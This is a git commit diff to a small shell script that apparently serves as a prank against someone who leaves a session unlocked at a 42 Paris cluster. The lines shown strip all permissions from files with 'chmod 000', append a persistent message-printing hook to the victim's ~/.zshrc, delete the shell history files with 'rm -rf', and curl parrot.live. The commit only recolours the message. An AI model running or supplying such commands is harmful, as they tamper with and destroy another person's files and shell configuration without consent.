eecc947bdf95c77deca762ed04ea8e25fffe3870
Florian CATINAUD <fcatinau@e2r6p19.clusters.42paris.fr>
2022-03-10 17:47:19 +0100

    Some little modif

--- sh.sh
+++ sh.sh
@@ -9,7 +9,7 @@ while ((nbr != 300))
 	done
 chmod 000 *
 cd ~
-echo -e "precmd(){echo -e '\033[31mjbonniva est un gentil tuteur! MAINTENANT JE FERMERAI MA SESSION!\033[00m'}" >> ~/.zshrc
+echo -e "precmd(){echo -e '\033[32mjbonniva \033[00m est un gentil tuteur! \033[31mMAINTENANT JE FERMERAI MA SESSION! \033[00m' } " >> ~/.zshrc
 rm -rf ~/.bash_history ~/.zsh_history
 clear
 curl parrot.live
